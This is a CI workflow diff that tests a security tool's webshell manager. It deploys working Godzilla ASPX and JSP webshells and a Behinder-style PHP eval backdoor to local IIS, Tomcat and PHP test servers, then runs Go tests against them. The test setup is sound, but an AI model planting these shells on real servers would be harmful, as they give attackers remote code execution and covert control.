@@ -1,0 +1,274 @@
+name: WebShell Tests
+
+on:
+  pull_request:
+    branches: [ main ]
+    types: [ opened, synchronize, reopened ]
+    paths:
+      - "common/wsm/**"
+      - "common/yakgrpc/yakit/webshell.go"
+      - ".github/workflows/wsm-test.yml"
+
+jobs:
+  setup-iis-aspnet-4_5:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup IIS
+        shell: powershell
+        run: |
+          Import-Module WebAdministration
+          # https://github.com/Microsoft/aspnet-docker/issues/33
+          Add-LocalGroupMember -Group 'Administrators' -Member 'IIS AppPool\DefaultAppPool';
+          # 确保IIS功能已经被启用
+          Dism /online /Enable-Feature /FeatureName:IIS-WebServer
+          Dism /online /Enable-Feature /FeatureName:IIS-ASPNET45
+          Dism /online /Enable-Feature /FeatureName:IIS-DirectoryBrowsing
+      - name: Deploy Godzilla Aspx Aes base64 Shell
+        run: |
+          $directoryPath = "C:\inetpub\wwwroot\abcd"
+          $filePath1 = "$directoryPath\gbs64.aspx"
+          $filePath2 = "$directoryPath\gbs64.txt"
+          $content = @"
+          <%@ Page Language="C#" Debug="true" %>
+          <%@ Import Namespace="System.Reflection" %>
+          <%
+              try
+              {
+                  string key = "3c6e0b8a9c15224a";
+                  string pass = "pass";
+          
+                  string md5 = System.BitConverter.ToString(
+                      new System.Security.Cryptography.MD5CryptoServiceProvider()
+                          .ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))
+                      ).Replace("-", "");
+          
+                  byte[] data = System.Convert.FromBase64String(Context.Request[pass]);
+                  data = new System.Security.Cryptography.RijndaelManaged()
+                      .CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key))
+                      .TransformFinalBlock(data, 0, data.Length);
+                  Console.WriteLine(System.Text.Encoding.Default.GetString(data));
+                  if (Context.Session["payload"] == null)
+                  {
+                      Assembly assembly = Assembly.Load(data);
+                      Type lyType = assembly.GetTypes()[1];
+                      Console.WriteLine(lyType);
+                      object lyInstance = Activator.CreateInstance(lyType);
+                      object result = lyInstance.Equals(data);
+                      Console.WriteLine("zzz :"+result); 
+                      Context.Session["payload"] = lyInstance;
+                  }
+                  else
+                  {
+                      object o = Context.Session["payload"];
+                      System.IO.MemoryStream outStream = new System.IO.MemoryStream();
+                      o.Equals(Context);
+                      o.Equals(outStream);
+                      o.Equals(data);
+                      o.ToString();
+                      byte[] r = outStream.ToArray();
+          
+                      Context.Response.Write(md5.Substring(0, 16));
+                      Context.Response.Write(System.Convert.ToBase64String(
+                          new System.Security.Cryptography.RijndaelManaged()
+                              .CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key))
+                              .TransformFinalBlock(r, 0, r.Length)
+                          ));
+                      Context.Response.Write(md5.Substring(16));
+                  }
+              }
+              catch (System.Exception e)
+              {
+                  Console.WriteLine(e.ToString());
+              }
+          %>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath1 -Encoding UTF8
+          $content | Out-File -FilePath $filePath2 -Encoding UTF8
+      - name: Deploy Echo Application
+        run: |
+          $directoryPath = "C:\inetpub\wwwroot\abcd"
+          $filePath1 = "$directoryPath\echo.aspx"
+          $content = @"
+          <%@ Page Language="C#" Debug="true" %>
+          <script runat="server">
+              protected void Page_Load(object sender, EventArgs e)
+              {
+                  Response.Write("Hello ASPX");
+              }
+          </script>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath1 -Encoding UTF8
+      - name: Configure IIS Listening 8087
+        shell: cmd
+        run: |
+          @echo off
+          SET siteName=MyWebsite
+          SET appPoolName=DefaultAppPool
+          SET port=8087
+          SET physicalPath=C:\inetpub\wwwroot\abcd
+          
+          :: Check if the DefaultAppPool exists, add if it does not
+          %SystemRoot%\system32\inetsrv\appcmd list apppool /name:%appPoolName%
+          IF %ERRORLEVEL% == 1 (
+              %SystemRoot%\system32\inetsrv\appcmd add apppool /name:%appPoolName%
+          )
+          
+          :: Create or update the website
+          %SystemRoot%\system32\inetsrv\appcmd list site /name:%siteName%
+          IF %ERRORLEVEL% == 1 (
+            %SystemRoot%\system32\inetsrv\appcmd add site /name:%siteName% /bindings:http/*:%port%: /physicalPath:%physicalPath%
+          ) ELSE (
+            %SystemRoot%\system32\inetsrv\appcmd set site %siteName% /bindings:http/*:%port%: /physicalPath:%physicalPath%
+          )
+          
+          :: Associate the website with the application pool
+          %SystemRoot%\system32\inetsrv\appcmd set app "%siteName%/" /applicationPool:%appPoolName%
+          
+          :: Start the website
+          %SystemRoot%\system32\inetsrv\appcmd start site %siteName%
+      - name: Fetch and Display Content of echo.aspx
+        shell: powershell
+        run: |
+          $url = "http://127.0.0.1:8087/echo.aspx"
+          try {
+            $response = Invoke-WebRequest -Uri $url
+            Write-Output "Response Body:"
+            Write-Output $response.Content
+          } catch {
+            Write-Error "Failed to fetch URL $url. Error: $_"
+          }
+      - name: Run Tests
+        run: |
+          go test -timeout 20s -run TestMUSTPASS_Godzilla_ASPX_Base64 ./common/wsm
+  setup-jdk-1_8:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 1.8
+        uses: actions/setup-java@v4.2.1
+        with:
+          java-version: '8.0.201'
+          distribution: 'zulu'
+      - name: Download Tomcat 8.5.20
+        run: |
+          curl -o tomcat.zip https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20-windows-x64.zip
+          7z x tomcat.zip -oC:\tomcat
+          echo "C:\tomcat\apache-tomcat-8.5.20\bin" >> $env:GITHUB_PATH
+          echo "CATALINA_HOME=C:\tomcat\apache-tomcat-8.5.20" | Out-File -Append -Encoding utf8 $env:GITHUB_ENV
+      - name: Modify Tomcat port in server.xml
+        run: |
+          $path = "C:\tomcat\apache-tomcat-8.5.20\conf\server.xml"
+          $content = Get-Content $path -Raw
+          $newContent = $content -replace 'port="8080"', 'port="8085"'
+          Set-Content -Path $path -Value $newContent
+      - name: Deploy Godzilla Aspx Aes base64 Shell
+        run: |
+          $directoryPath = "C:\tomcat\apache-tomcat-8.5.20\webapps\ROOT"
+          $filePath = "$directoryPath\godzilla_bs64.jsp"
+          $content = @"
+          <%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath -Encoding UTF8
+      - name: Install Tomcat as a Service
+        run: |
+          C:\tomcat\apache-tomcat-8.5.20\bin\service.bat install
+        shell: cmd
+
+      - name: Start Tomcat Service
+        run: |
+          sc start Tomcat8
+        shell: cmd
+      - name: Check Tomcat Service Status
+        run: |
+          $serviceStatus = sc query Tomcat8 | Select-String "RUNNING|START_PENDING"
+          if (-not $serviceStatus) {
+            echo "Tomcat service is not running"
+            exit 1  # Exit with an error status
+          }
+        shell: pwsh
+      # Debug
+      # - name: Display multiple Tomcat logs
+      #   run: |
+      #     $logDir = "C:\tomcat\apache-tomcat-8.5.20\logs"
+      #     Get-ChildItem $logDir -Filter *.log | ForEach-Object {
+      #       Write-Host "Showing contents of $($_.Name):"
+      #       Get-Content $_.FullName
+      #     }
+      #   shell: pwsh
+      # - name: Show netstat results
+      #   run: |
+      #     netstat -an
+      #   shell: pwsh
+      - name: Run JSP Shell Tests
+        run: |
+          go test -timeout 30s -run TestMUSTPASS_Godzilla_JSP_Base64 ./common/wsm
+  start-php-5_4_45:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup PHP 5.4.45
+        run: |
+          Invoke-WebRequest -Uri "https://windows.php.net/downloads/releases/archives/php-5.4.45-Win32-VC9-x86.zip" -OutFile "php.zip"
+          Expand-Archive -Path "php.zip" -DestinationPath "$env:RUNNER_TEMP\php"
+          echo "$env:RUNNER_TEMP\php" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+      - name: Deploy Behinder PHP Shell
+        run: |
+          $directoryPath = "C:\phpwww"
+          $filePath = "$directoryPath\bx4-bs64.php"
+          $content = @"
+          <?php
+            function Decrypt(`$data) {
+                `$data = substr(`$data, 37, strlen(`$data) - 40);
+                `$data = str_replace('go0p', '+', `$data);
+                `$data = str_replace('yakit', '/', `$data);
+                return base64_decode(`$data);
+            }
+            `$post = Decrypt(file_get_contents('php://input'));
+            eval(`$post);
+          ?>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+
+          # Write content to files
+          $content | Out-File -FilePath $filePath -Encoding UTF8
+
+          $fileContent = Get-Content -Path $filePath
+          Write-Host "File content of ${filePath}:"
+          Write-Host $fileContent
+      - name: Start PHP server # 后台运行
+        run: |
+          Start-Process -FilePath "php" -ArgumentList "-S 127.0.0.1:8086 -t C:\phpwww"
+        shell: pwsh
+      - name: Wait for server to start
+        run: Start-Sleep -Seconds 5
+      - name: Run PHP Shell Tests
+        run: |
+          go test -timeout 30s -run TestMUSTPASS_Behinder_PHP ./common/wsm
